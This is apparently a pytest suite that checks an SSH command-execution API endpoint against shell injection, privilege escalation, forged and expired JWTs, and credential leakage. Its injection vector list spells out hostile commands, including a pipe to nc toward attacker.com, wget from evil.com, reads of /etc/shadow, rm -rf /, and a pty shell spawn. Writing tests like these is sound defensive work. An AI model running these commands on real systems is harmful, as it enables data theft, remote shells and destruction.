import asyncio
import time
from datetime import datetime, timedelta, timezone
from unittest.mock import AsyncMock, patch, MagicMock

import pytest
from fastapi import HTTPException, status
from fastapi.testclient import TestClient
import httpx
from jose import jwt
import asyncssh

from api.deps import get_current_user, require_superadmin
from api.main import app
from core.config import settings
from core.models.tb_server import TBServer, SSHAuthMethod
from core.models.user import User
from core.services.ssh_service import (
    ALLOWED_SSH_COMMANDS,
    validate_ssh_command,
    execute_ssh_command_on_server,
)


def _create_mock_user(
    role="superadmin",
    is_superuser=True,
    is_active=True,
    user_id="65f01234567890abcdef0001",
    username="superadmin_test"
):
    user = MagicMock(spec=User)
    user.id = user_id
    user.username = username
    user.email = f"{username}@platform.io"
    user.role = role
    user.is_superuser = is_superuser
    user.is_active = is_active
    user.must_change_password = False
    return user


def _create_mock_server(
    server_id="65f01234567890abcdef9999",
    name="TB-Production-Primary",
    base_url="https://tb-master.internal.corp",
    ssh_host="tb-master.internal.corp",
    ssh_port=22,
    ssh_username="tb-admin",
    ssh_auth_method=SSHAuthMethod.PASSWORD,
    password="FernetDecrypted_SuperSecretPassword_2026!#$",
    pem_file=None,
    passphrase=None
):
    server = MagicMock(spec=TBServer)
    server.id = server_id
    server.name = name
    server.base_url = base_url
    server.ssh_host = ssh_host
    server.ssh_port = ssh_port
    server.ssh_username = ssh_username
    server.ssh_auth_method = ssh_auth_method
    server.get_ssh_password = MagicMock(return_value=password)
    server.get_ssh_pem_file = MagicMock(return_value=pem_file)
    server.get_ssh_passphrase = MagicMock(return_value=passphrase)
    server.user_id = "65f01234567890abcdef0001"
    server.is_active = True
    return server


# ==============================================================================
# 1. COMMAND INJECTION & METACHARACTER BYPASS ATTACKS (PRIMARY INVARIANT)
# ==============================================================================

ADVERSARIAL_INJECTION_VECTORS = [
    # Semicolon chaining
    ("semicolon_id", "systemctl restart thingsboard; id"),
    ("semicolon_whoami_prefix", "; whoami"),
    ("semicolon_suffix", "systemctl restart thingsboard;"),
    ("semicolon_spaced", "systemctl restart thingsboard ;"),
    ("semicolon_isolated", ";"),
    ("semicolon_multiple", ";;;;"),
    # Logic chaining (AND / OR)
    ("and_shadow", "systemctl restart thingsboard && cat /etc/shadow"),
    ("or_reboot", "systemctl restart thingsboard || reboot"),
    ("and_chained_allowed", "uptime && df -h"),
    ("or_chained_uname", "df -h || uname -a"),
    ("and_isolated", "&& whoami"),
    ("or_isolated", "|| id"),
    # Pipe chaining
    ("pipe_sh", "systemctl restart thingsboard | sh"),
    ("pipe_nc_c2", "uptime | nc attacker.com 4444"),
    ("pipe_grep", "df -h | grep sda"),
    ("pipe_bash", "free -m | /bin/bash"),
    ("pipe_isolated", "| id"),
    # Subshell & Command substitution
    ("subshell_whoami", "$(whoami)"),
    ("backtick_id", "`id`"),
    ("subshell_nested_passwd", "systemctl restart thingsboard $(cat /etc/passwd)"),
    ("backtick_nested_shadow", "systemctl restart thingsboard `cat /etc/shadow`"),
    ("subshell_uptime", "uptime $(id)"),
    ("backtick_free", "free -m `uname -a`"),
    ("subshell_reboot", "$(reboot)"),
    ("backtick_shutdown", "`shutdown -h now`"),
    # Shell variables & environment expansion
    ("var_user", "$USER"),
    ("var_path_braces", "${PATH}"),
    ("var_ifs", "$IFS"),
    ("var_echo_home", "echo $HOME"),
    ("var_injected_cmd", "systemctl restart thingsboard $USER"),
    ("var_pwd_uptime", "uptime $PWD"),
    # Redirection operators
    ("redir_out", "systemctl restart thingsboard > /tmp/pwned"),
    ("redir_in_zero", "systemctl restart thingsboard < /dev/zero"),
    ("redir_append", "uptime >> /tmp/out"),
    ("redir_stderr", "free -m 2>&1"),
    ("redir_shadow_in", "df -h < /etc/shadow"),
    ("redir_null", "df -h > /dev/null"),
    # Newline & carriage return injection
    ("newline_passwd", "systemctl restart thingsboard\ncat /etc/passwd"),
    ("crlf_whoami", "systemctl restart thingsboard\r\nwhoami"),
    ("newline_id", "systemctl restart thingsboard\nid"),
    ("newline_prefix", "\nuptime"),
    ("crlf_prefix", "\r\ndf -h"),
    # Null-byte injection
    ("null_byte_whoami", "systemctl restart thingsboard\0whoami"),
    ("null_byte_uptime", "uptime\0"),
    ("null_byte_prefix", "\0systemctl status thingsboard"),
    ("null_byte_semicolon", "systemctl restart thingsboard\0; id"),
    # Non-whitelisted dangerous commands
    ("danger_rm_rf", "rm -rf /"),
    ("danger_shadow", "cat /etc/shadow"),
    ("danger_curl", "curl http://malicious.com"),
    ("danger_shutdown", "shutdown -h now"),
    ("danger_sudo_su", "sudo su"),
    ("danger_bash", "bash"),
    ("danger_sh", "sh"),
    ("danger_zsh", "zsh"),
    ("danger_pty_python", 'python -c "import pty; pty.spawn(\'/bin/bash\')"'),
    ("danger_nc_listen", "nc -lvnp 4444"),
    ("danger_wget", "wget http://evil.com/shell"),
    ("danger_reboot", "reboot"),
    ("danger_init_0", "init 0"),
    ("danger_killall", "killall -9 thingsboard"),
    ("danger_chmod", "chmod 777 /etc/passwd"),
    ("danger_useradd", "useradd hacker"),
    ("danger_passwd_del", "passwd -d root"),
    # Obfuscation & Case sensitivity variants
    ("case_upper_restart", "SYSTEMCTL RESTART THINGSBOARD"),
    ("case_mixed_status", "Systemctl Status Thingsboard"),
    ("case_upper_uptime", "UPTIME"),
    ("wildcard_restart", "systemctl restart thingsboard*"),
    ("tab_separated_id", "uptime\t;id"),
]


class TestAdversarialCommandInjection:
    """
    Stress tests verifying that ANY attempt at shell injection, chaining, metacharacters,
    or unauthorized commands is rejected with HTTP 400 and NEVER triggers an SSH connection.
    """

    @pytest.mark.parametrize("vector_name,command", ADVERSARIAL_INJECTION_VECTORS)
    def test_unit_validate_ssh_command_rejects_vector(self, vector_name, command):
        """Verifica a nivel unitario que el validador rechaza todas las inyecciones."""
        with pytest.raises(HTTPException) as exc_info:
            validate_ssh_command(command)
        assert exc_info.value.status_code == status.HTTP_400_BAD_REQUEST

    @pytest.mark.parametrize("vector_name,command", ADVERSARIAL_INJECTION_VECTORS)
    def test_endpoint_blocks_injection_without_calling_ssh(self, vector_name, command):
        """
        PRIMARY INVARIANT VERIFICATION:
        1. Endpoint returns HTTP 400 Bad Request.
        2. asyncssh.connect is NEVER called (call_count == 0).
        """
        superadmin = _create_mock_user(role="superadmin", is_superuser=True)
        app.dependency_overrides[require_superadmin] = lambda: superadmin

        mock_server = _create_mock_server()

        client = TestClient(app)
        try:
            with patch("core.models.tb_server.TBServer.get", new_callable=AsyncMock, return_value=mock_server), \
                 patch("asyncssh.connect", new_callable=AsyncMock) as mock_ssh_connect:

                response = client.post(
                    f"/api/v1/servers/{mock_server.id}/ssh/execute",
                    json={"command": command, "timeout_seconds": 30}
                )

                assert response.status_code == status.HTTP_400_BAD_REQUEST, (
                    f"Vector '{vector_name}' failed! Returned {response.status_code}: {response.text}"
                )
                # Absolute invariant: Zero SSH connections initiated
                assert mock_ssh_connect.call_count == 0, (
                    f"CRITICAL SECURITY FLAW: asyncssh.connect was called for malicious vector '{vector_name}'!"
                )
        finally:
            app.dependency_overrides.clear()


# ==============================================================================
# 2. IAM & PRIVILEGE ESCALATION ATTACKS
# ==============================================================================

class TestAdversarialIAMPrivilegeEscalation:
    """
    Evaluates role-based access control, privilege boundaries, and token authenticity.
    Verifies that only genuine superadministrators can execute remote SSH commands.
    """

    def test_unauthenticated_request_rejected_with_401(self):
        """Petición anónima (sin header Authorization) debe ser rechazada con HTTP 401."""
        app.dependency_overrides.clear()
        client = TestClient(app)

        response = client.post(
            "/api/v1/servers/65f01234567890abcdef9999/ssh/execute",
            json={"command": "uptime", "timeout_seconds": 30}
        )
        assert response.status_code == status.HTTP_401_UNAUTHORIZED

    def test_forged_jwt_token_rejected_with_401(self):
        """Token JWT con firma falsificada debe ser rechazado con HTTP 401."""
        app.dependency_overrides.clear()
        forged_token = jwt.encode(
            {"sub": "attacker", "user_id": "65f01234567890abcdef0002", "role": "superadmin"},
            "WRONG_SECRET_KEY_FORGED",
            algorithm="HS256"
        )

        client = TestClient(app)
        response = client.post(
            "/api/v1/servers/65f01234567890abcdef9999/ssh/execute",
            headers={"Authorization": f"Bearer {forged_token}"},
            json={"command": "uptime", "timeout_seconds": 30}
        )
        assert response.status_code == status.HTTP_401_UNAUTHORIZED

    def test_expired_jwt_token_rejected_with_401(self):
        """Token JWT expirado debe ser rechazado con HTTP 401."""
        app.dependency_overrides.clear()
        expired_token = jwt.encode(
            {
                "sub": "user_expired",
                "user_id": "65f01234567890abcdef0003",
                "exp": int((datetime.now(timezone.utc) - timedelta(hours=2)).timestamp())
            },
            settings.SECRET_KEY,
            algorithm=settings.ALGORITHM
        )

        client = TestClient(app)
        response = client.post(
            "/api/v1/servers/65f01234567890abcdef9999/ssh/execute",
            headers={"Authorization": f"Bearer {expired_token}"},
            json={"command": "uptime", "timeout_seconds": 30}
        )
        assert response.status_code == status.HTTP_401_UNAUTHORIZED

    @pytest.mark.parametrize("unauthorized_role", [
        "admin",          # admin standard without is_superuser=True
        "tenant_admin",   # tenant admin
        "operator",       # operations staff
        "viewer",         # read-only user
        "user",           # regular user
    ])
    def test_authenticated_non_superadmin_rejected_with_403(self, unauthorized_role):
        """Usuarios autenticados con roles inferiores a superadmin reciben HTTP 403 Forbidden."""
        caller = _create_mock_user(role=unauthorized_role, is_superuser=False)
        app.dependency_overrides[get_current_user] = lambda: caller

        mock_server = _create_mock_server()
        client = TestClient(app)
        try:
            with patch("core.models.tb_server.TBServer.get", new_callable=AsyncMock, return_value=mock_server), \
                 patch("asyncssh.connect", new_callable=AsyncMock) as mock_ssh_connect:

                response = client.post(
                    f"/api/v1/servers/{mock_server.id}/ssh/execute",
                    json={"command": "uptime", "timeout_seconds": 30}
                )

                assert response.status_code == status.HTTP_403_FORBIDDEN
                assert "superadministrador" in response.json()["detail"].lower()
                assert mock_ssh_connect.call_count == 0
        finally:
            app.dependency_overrides.clear()

    @pytest.mark.parametrize("role,is_superuser", [
        ("superadmin", False),
        ("admin", True),
        ("superadmin", True),
    ])
    def test_genuine_superadmins_allowed_access(self, role, is_superuser):
        """Usuarios con rol 'superadmin' o flag 'is_superuser=True' acceden satisfactoriamente."""
        caller = _create_mock_user(role=role, is_superuser=is_superuser)
        app.dependency_overrides[get_current_user] = lambda: caller

        mock_server = _create_mock_server()
        mock_process = MagicMock(exit_status=0, stdout="up 10 days\n", stderr="")
        mock_conn = AsyncMock(run=AsyncMock(return_value=mock_process))
        mock_cm = AsyncMock(__aenter__=AsyncMock(return_value=mock_conn), __aexit__=AsyncMock(return_value=None))

        client = TestClient(app)
        try:
            with patch("core.models.tb_server.TBServer.get", new_callable=AsyncMock, return_value=mock_server), \
                 patch("asyncssh.connect", return_value=mock_cm):

                response = client.post(
                    f"/api/v1/servers/{mock_server.id}/ssh/execute",
                    json={"command": "uptime", "timeout_seconds": 30}
                )

                assert response.status_code == status.HTTP_200_OK
                assert response.json()["command"] == "uptime"
                assert response.json()["exit_status"] == 0
        finally:
            app.dependency_overrides.clear()


# ==============================================================================
# 3. ZERO CREDENTIAL & PRIVATE KEY LEAKAGE
# ==============================================================================

class TestAdversarialCredentialLeakage:
    """
    Rigorous verification that decrypted plaintext credentials, private keys, and passphrases
    NEVER appear in API responses, headers, or exception details under failure conditions.
    """

    SECRET_PASSWORD = "FernetDecrypted_SuperSecretPassword_2026!#$"
    SECRET_PEM_KEY = (
        "-----BEGIN RSA PRIVATE KEY-----\n"
        "MIIEowIBAAKCAQEA0rSecretPrivateKeyContentDoNotLeakUnderAnyCircumstance\n"
        "-----END RSA PRIVATE KEY-----"
    )
    SECRET_PASSPHRASE = "TopSecretPassphrase_For_Rsa_Key_987654"

    def test_auth_failure_password_no_credential_leakage(self):
        """Fallo de autenticación SSH por contraseña no expone el password en respuesta ni headers."""
        superadmin = _create_mock_user()
        app.dependency_overrides[require_superadmin] = lambda: superadmin

        mock_server = _create_mock_server(
            ssh_auth_method=SSHAuthMethod.PASSWORD,
            password=self.SECRET_PASSWORD
        )

        client = TestClient(app)
        try:
            with patch("core.models.tb_server.TBServer.get", new_callable=AsyncMock, return_value=mock_server), \
                 patch("asyncssh.connect", side_effect=asyncssh.PermissionDenied("Invalid password authentication")):

                response = client.post(
                    f"/api/v1/servers/{mock_server.id}/ssh/execute",
                    json={"command": "uptime", "timeout_seconds": 30}
                )

                assert response.status_code == status.HTTP_502_BAD_GATEWAY
                body_str = response.text
                headers_str = str(dict(response.headers))

                # Assert zero secret leakage
                assert self.SECRET_PASSWORD not in body_str
                assert self.SECRET_PASSWORD not in headers_str
                assert "autenticación SSH" in response.json()["detail"]
        finally:
            app.dependency_overrides.clear()

    def test_auth_failure_pem_key_no_private_key_or_passphrase_leakage(self):
        """Fallo de autenticación por llave PEM no expone contenido del archivo PEM ni passphrase."""
        superadmin = _create_mock_user()
        app.dependency_overrides[require_superadmin] = lambda: superadmin

        mock_server = _create_mock_server(
            ssh_auth_method=SSHAuthMethod.PEM_KEY,
            pem_file=self.SECRET_PEM_KEY,
            passphrase=self.SECRET_PASSPHRASE
        )

        mock_key = MagicMock()
        client = TestClient(app)
        try:
            with patch("core.models.tb_server.TBServer.get", new_callable=AsyncMock, return_value=mock_server), \
                 patch("asyncssh.import_private_key", return_value=mock_key), \
                 patch("asyncssh.connect", side_effect=asyncssh.PermissionDenied("Public key rejected")):

                response = client.post(
                    f"/api/v1/servers/{mock_server.id}/ssh/execute",
                    json={"command": "uptime", "timeout_seconds": 30}
                )

                assert response.status_code == status.HTTP_502_BAD_GATEWAY
                body_str = response.text

                assert self.SECRET_PEM_KEY not in body_str
                assert self.SECRET_PASSPHRASE not in body_str
                assert "RSA PRIVATE KEY" not in body_str
        finally:
            app.dependency_overrides.clear()

    def test_connection_timeout_no_credential_leakage(self):
        """Timeout de conexión SSH (HTTP 504) no filtra credenciales."""
        superadmin = _create_mock_user()
        app.dependency_overrides[require_superadmin] = lambda: superadmin

        mock_server = _create_mock_server(password=self.SECRET_PASSWORD)

        client = TestClient(app)
        try:
            with patch("core.models.tb_server.TBServer.get", new_callable=AsyncMock, return_value=mock_server), \
                 patch("asyncssh.connect", side_effect=TimeoutError("Connection timed out after 30s")):

                response = client.post(
                    f"/api/v1/servers/{mock_server.id}/ssh/execute",
                    json={"command": "uptime", "timeout_seconds": 30}
                )

                assert response.status_code == status.HTTP_504_GATEWAY_TIMEOUT
                assert self.SECRET_PASSWORD not in response.text
                assert "Tiempo de espera agotado" in response.json()["detail"]
        finally:
            app.dependency_overrides.clear()

    def test_network_os_error_no_credential_leakage(self):
        """Error de socket de red / conexión rechazada (HTTP 502) no filtra credenciales."""
        superadmin = _create_mock_user()
        app.dependency_overrides[require_superadmin] = lambda: superadmin

        mock_server = _create_mock_server(password=self.SECRET_PASSWORD)

        client = TestClient(app)
        try:
            with patch("core.models.tb_server.TBServer.get", new_callable=AsyncMock, return_value=mock_server), \
                 patch("asyncssh.connect", side_effect=OSError(111, "Connection refused to 10.0.0.1")):

                response = client.post(
                    f"/api/v1/servers/{mock_server.id}/ssh/execute",
                    json={"command": "uptime", "timeout_seconds": 30}
                )

                assert response.status_code == status.HTTP_502_BAD_GATEWAY
                assert self.SECRET_PASSWORD not in response.text
                assert "OSError" in response.json()["detail"]
        finally:
            app.dependency_overrides.clear()

    def test_corrupt_pem_import_error_no_passphrase_leakage(self):
        """Llave privada PEM corrupta o passphrase errónea (HTTP 400) no expone secretos."""
        superadmin = _create_mock_user()
        app.dependency_overrides[require_superadmin] = lambda: superadmin

        mock_server = _create_mock_server(
            ssh_auth_method=SSHAuthMethod.PEM_KEY,
            pem_file=self.SECRET_PEM_KEY,
            passphrase=self.SECRET_PASSPHRASE
        )

        client = TestClient(app)
        try:
            with patch("core.models.tb_server.TBServer.get", new_callable=AsyncMock, return_value=mock_server), \
                 patch("asyncssh.import_private_key", side_effect=asyncssh.KeyEncryptionError("Incorrect passphrase supplied")):

                response = client.post(
                    f"/api/v1/servers/{mock_server.id}/ssh/execute",
                    json={"command": "uptime", "timeout_seconds": 30}
                )

                assert response.status_code == status.HTTP_400_BAD_REQUEST
                assert self.SECRET_PEM_KEY not in response.text
                assert self.SECRET_PASSPHRASE not in response.text
                assert "la llave privada PEM o passphrase son incorrectas" in response.json()["detail"]
        finally:
            app.dependency_overrides.clear()


# ==============================================================================
# 4. CONCURRENCY & EVENT LOOP LATENCY ROBUSTNESS
# ==============================================================================

class TestAdversarialConcurrencyAndResilience:
    """
    Stress tests verifying system resilience during high concurrency bursts (20 concurrent requests),
    measuring event loop latency, and verifying non-blocking execution.
    """

    @pytest.mark.asyncio
    async def test_concurrent_burst_20_requests_and_event_loop_latency(self):
        """
        Burst de 20 peticiones concurrentes autorizadas vía asyncio.gather:
        1. Todas las 20 peticiones deben completarse exitosamente con HTTP 200.
        2. Monitoreo del event loop en segundo plano: la latencia de jitter debe ser < 200ms.
        3. Zero event loop stalls o bloqueos sincrónicos.
        """
        superadmin = _create_mock_user()
        app.dependency_overrides[require_superadmin] = lambda: superadmin

        mock_server = _create_mock_server()

        async def _mock_run(cmd, timeout, check):
            await asyncio.sleep(0.01)  # Simular latencia de red asíncrona no bloqueante
            mock_proc = MagicMock()
            mock_proc.exit_status = 0
            mock_proc.stdout = f"Command output for {cmd}\n"
            mock_proc.stderr = ""
            return mock_proc

        mock_conn = AsyncMock(run=_mock_run)
        mock_cm = AsyncMock(__aenter__=AsyncMock(return_value=mock_conn), __aexit__=AsyncMock(return_value=None))

        # Monitor de latencia del event loop (heartbeat a 5ms)
        max_jitter = 0.0
        stop_monitor = asyncio.Event()

        async def _loop_monitor():
            nonlocal max_jitter
            tick = 0.005
            while not stop_monitor.is_set():
                t0 = time.perf_counter()
                await asyncio.sleep(tick)
                elapsed = time.perf_counter() - t0
                jitter = elapsed - tick
                if jitter > max_jitter:
                    max_jitter = jitter

        monitor_task = asyncio.create_task(_loop_monitor())

        try:
            transport = httpx.ASGITransport(app=app)
            async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
                with patch("core.models.tb_server.TBServer.get", new_callable=AsyncMock, return_value=mock_server), \
                     patch("asyncssh.connect", return_value=mock_cm):

                    allowed_cmds = [
                        "systemctl status thingsboard",
                        "uptime",
                        "df -h",
                        "free -m",
                    ]

                    # Generar 20 tareas concurrentes
                    tasks = [
                        client.post(
                            f"/api/v1/servers/{mock_server.id}/ssh/execute",
                            json={"command": allowed_cmds[i % len(allowed_cmds)], "timeout_seconds": 30}
                        )
                        for i in range(20)
                    ]

                    start_wall = time.perf_counter()
                    responses = await asyncio.gather(*tasks)
                    total_duration = time.perf_counter() - start_wall

            stop_monitor.set()
            await monitor_task

            # 1. Verificar que todas las 20 peticiones fueron exitosas (HTTP 200)
            assert len(responses) == 20
            for resp in responses:
                assert resp.status_code == status.HTTP_200_OK
                data = resp.json()
                assert data["exit_status"] == 0
                assert data["duration_ms"] > 0
                assert data["host"] == mock_server.ssh_host

            # 2. Invariante de Event Loop: El jitter máximo debe ser menor a 200ms
            max_jitter_ms = max_jitter * 1000
            assert max_jitter_ms < 200.0, (
                f"Event loop stall detectado! Max jitter={max_jitter_ms:.2f}ms excedió el umbral de 200ms."
            )

        finally:
            stop_monitor.set()
            app.dependency_overrides.clear()

    @pytest.mark.asyncio
    async def test_ssh_custom_timeout_parameter_forwarded(self):
        """Verifica que el parámetro timeout_seconds se propaga con exactitud a conn.run."""
        superadmin = _create_mock_user()
        app.dependency_overrides[require_superadmin] = lambda: superadmin

        mock_server = _create_mock_server()
        mock_process = MagicMock(exit_status=0, stdout="disk usage", stderr="")
        mock_conn = AsyncMock(run=AsyncMock(return_value=mock_process))
        mock_cm = AsyncMock(__aenter__=AsyncMock(return_value=mock_conn), __aexit__=AsyncMock(return_value=None))

        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
            try:
                with patch("core.models.tb_server.TBServer.get", new_callable=AsyncMock, return_value=mock_server), \
                     patch("asyncssh.connect", return_value=mock_cm):

                    response = await client.post(
                        f"/api/v1/servers/{mock_server.id}/ssh/execute",
                        json={"command": "df -h", "timeout_seconds": 17}
                    )

                    assert response.status_code == status.HTTP_200_OK
                    mock_conn.run.assert_called_once_with(
                        "df -h",
                        timeout=17,
                        check=False
                    )
            finally:
                app.dependency_overrides.clear()

    @pytest.mark.asyncio
    async def test_ssh_command_run_timeout_raises_504(self):
        """Verifica que un timeout durante conn.run retorne limpiamente HTTP 504."""
        superadmin = _create_mock_user()
        app.dependency_overrides[require_superadmin] = lambda: superadmin

        mock_server = _create_mock_server()
        mock_conn = AsyncMock(run=AsyncMock(side_effect=asyncio.TimeoutError("Command run exceeded timeout")))
        mock_cm = AsyncMock(__aenter__=AsyncMock(return_value=mock_conn), __aexit__=AsyncMock(return_value=None))

        transport = httpx.ASGITransport(app=app)
        async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
            try:
                with patch("core.models.tb_server.TBServer.get", new_callable=AsyncMock, return_value=mock_server), \
                     patch("asyncssh.connect", return_value=mock_cm):

                    response = await client.post(
                        f"/api/v1/servers/{mock_server.id}/ssh/execute",
                        json={"command": "journalctl -u thingsboard -n 100 --no-pager", "timeout_seconds": 5}
                    )

                    assert response.status_code == status.HTTP_504_GATEWAY_TIMEOUT
                    assert "Tiempo de espera agotado (5s)" in response.json()["detail"]
            finally:
                app.dependency_overrides.clear()
